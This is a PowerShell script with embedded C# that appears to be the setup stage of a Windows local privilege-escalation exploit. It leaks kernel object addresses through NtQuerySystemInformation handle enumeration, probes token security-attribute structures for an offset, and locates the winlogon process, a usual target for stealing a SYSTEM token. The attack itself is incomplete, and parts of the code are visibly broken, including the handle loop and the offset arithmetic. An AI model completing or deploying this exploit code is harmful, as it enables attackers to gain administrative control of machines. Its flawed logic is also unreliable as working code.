$signature = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

public class ProgramCSHARP
{
    // Constantes y definiciones
    private const uint TOKEN_ALL_ACCESS = 0xF01FF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_READWRITE = 0x04;

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups = 2,
        TokenPrivileges = 3,
        TokenOwner = 4,
        TokenPrimaryGroup = 5,
        TokenDefaultDacl = 6,
        TokenSource = 7,
        TokenType = 8,
        TokenImpersonationLevel = 9,
        TokenStatistics = 10,
        TokenRestrictedSids = 11,
        TokenSessionId = 12,
        TokenGroupsAndPrivileges = 13,
        TokenSessionReference = 14,
        TokenSandBoxInert = 15,
        TokenAuditPolicy = 16,
        TokenOrigin = 17,
        TokenElevationType = 18,
        TokenLinkedToken = 19,
        TokenElevation = 20,
        TokenHasRestrictions = 21,
        TokenAccessInformation = 22,
        TokenVirtualizationAllowed = 23,
        TokenVirtualizationEnabled = 24,
        TokenIntegrityLevel = 25,
        TokenUIAccess = 26,
        TokenMandatoryPolicy = 27,
        TokenLogonSid = 28,
        MaxTokenInfoClass = 29
    }
    public struct SYSTEM_HANDLE
    {
        public IntPtr Object;
        public IntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }

    public struct SYSTEM_HANDLE_INFORMATION_EX
    {
        public ulong HandleCount;
        public ulong Reserved;
        public SYSTEM_HANDLE Handles;
    }

    public enum SYSTEM_INFORMATION_CLASS
    {
        SystemExtendedHandleInformation = 64
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LIST_ENTRY
    {
        public IntPtr Flink;
        public IntPtr Blink;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
    {
        public uint SecurityAttributeCount;
        public LIST_ENTRY SecurityAttributesList;
        public uint WorkingSecurityAttributeCount;
        public LIST_ENTRY WorkingSecurityAttributesList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ACCESS_INFORMATION
    {
        // Aquí van los otros campos de la estructura
        public IntPtr SecurityAttributes; // Este es un puntero a AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
    }

    public delegate int NtQueryInformationTokenDelegate(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        uint TokenInformationLength,
        out uint ReturnLength
    );
    public delegate int NtQuerySystemInformationDelegate(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        IntPtr SystemInformation,
        uint SystemInformationLength,
        out uint ReturnLength
    );

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    // Importaciones de las DLL necesarias
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    public static IntPtr GetKernelPointerByHandle(IntPtr HandleValue)
    {
        IntPtr ntdll = GetModuleHandle("ntdll");
        IntPtr pQueryInfoToken = GetProcAddress(ntdll, "NtQuerySystemInformation");
        if (pQueryInfoToken == IntPtr.Zero)
        {
            Console.WriteLine("GetProcAddress() failed.");
            return IntPtr.Zero;
        }
        uint len = 20;
        int status = unchecked((int)0xc0000004);
        IntPtr pHandleInfo = IntPtr.Zero;
        do
        {
            len *= 2;
            pHandleInfo = Marshal.AllocHGlobal((int)len);

            NtQuerySystemInformationDelegate query = (NtQuerySystemInformationDelegate)Marshal.GetDelegateForFunctionPointer(pQueryInfoToken, typeof(NtQuerySystemInformationDelegate));
            status = query(SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, pHandleInfo, len, out len);

        } while (status == unchecked((int)0xc0000004));
        if (status != 0x0)
        {
            Console.WriteLine("NtQuerySystemInformation failed with error code 0x" + status.ToString("X"));
            return IntPtr.Zero;
        }

        uint CurrentPid = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;
        Console.WriteLine("CurrentPid:" + CurrentPid);
        SYSTEM_HANDLE_INFORMATION_EX handleInfo = (SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(pHandleInfo, typeof(SYSTEM_HANDLE_INFORMATION_EX));
        for (ulong i = 0; i < handleInfo.HandleCount; i++)
        {
            IntPtr objectPtr = handleInfo.Handles.Object;
            IntPtr handle = handleInfo.Handles.HandleValue;
            IntPtr pid = handleInfo.Handles.UniqueProcessId;

            if ((uint)pid == CurrentPid && handle == HandleValue)
            {
                Console.WriteLine("Found object!");
                return objectPtr;
            }
        }
        return IntPtr.Zero;
    }

    // Variables globales
    private static IntPtr hToken;
    // private static IntPtr kTokenAddr = IntPtr.Zero;
    private static IntPtr tokenInfo = IntPtr.Zero;
    private static NtQueryInformationTokenDelegate NtQueryInformationToken = null;
    private static uint Infolen = 0x1000;
    private static uint returnLength = 0;
    private static int OffsetToName = 0;

    public static void Main(string[] args)
    {
        // Inicializar la función NtQuerySystemInformation
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr pQueryInfoToken = GetProcAddress(ntdll, "NtQueryInformationToken");
        NtQueryInformationToken = (NtQueryInformationTokenDelegate)Marshal.GetDelegateForFunctionPointer(pQueryInfoToken, typeof(NtQueryInformationTokenDelegate));

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out hToken))
        {
            Console.WriteLine("OpenProcessToken() failed.");
            Environment.Exit(1);
        }
        // Print as two-digits hexadecimal 
        byte hTokenByte = (byte)hToken.ToInt32();
        string hTokenHex = hTokenByte.ToString("X2");
        Console.WriteLine("hToken: " + hTokenHex);

        /* kTokenAddr = GetKernelPointerByHandle(hToken);
        if (kTokenAddr == IntPtr.Zero)
        {
            Console.WriteLine("GetKernelPointerByHandle() failed.");
            Environment.Exit(1);
        }

        Console.WriteLine("kTokenAddr: " + kTokenAddr.ToString("X")); */

        tokenInfo = VirtualAlloc(IntPtr.Zero, Infolen, MEM_COMMIT, PAGE_READWRITE);
        if (tokenInfo == IntPtr.Zero)
        {
            Console.WriteLine("VirtualAlloc() failed.");
            Environment.Exit(1);
        }

        int status = NtQueryInformationToken(hToken, (TOKEN_INFORMATION_CLASS)22, tokenInfo, Infolen, out returnLength);
        Console.WriteLine("status: " + status);
        Console.WriteLine("returnLength: " + returnLength);

        if (status == 0)
        {
            TOKEN_ACCESS_INFORMATION tokenAccessInformation = (TOKEN_ACCESS_INFORMATION)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_ACCESS_INFORMATION));
            AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION securityAttributes = (AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION)Marshal.PtrToStructure(tokenAccessInformation.SecurityAttributes, typeof(AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION));

            if (securityAttributes.SecurityAttributeCount > 0)
            {
                byte[] Flink = new byte[Marshal.SizeOf(typeof(IntPtr))];
                Marshal.Copy(securityAttributes.SecurityAttributesList.Flink, Flink, 0, Flink.Length);

                if (Flink != null)
                {
                    OffsetToName = Flink[0] + 0x20 - (int)tokenInfo;
                    Console.WriteLine("Found target offset value: 0x" + OffsetToName.ToString("X"));
                }
            }
        }

        if (OffsetToName == 0)
        {
            Console.WriteLine("Target offset search failed.");
            Environment.Exit(1);
        }

        uint pid = GetPidByName("winlogon");

        if (pid == 0)
        {
            Console.WriteLine("GetPidByName() failed.");
            Environment.Exit(1);
        }

        Console.WriteLine("PID: " + pid);

        CloseHandle(hToken);
    }

    private static uint GetPidByName(string procName)
    {
        Process[] processes = Process.GetProcessesByName(procName);

        if (processes.Length > 0)
        {
            Process process = processes[0];
            int pid = process.Id;
            return (uint)pid;
        }

        return 0;
    }
}
"@

Add-Type -TypeDefinition $signature -Language CSharp

[ProgramCSHARP]::Main(@())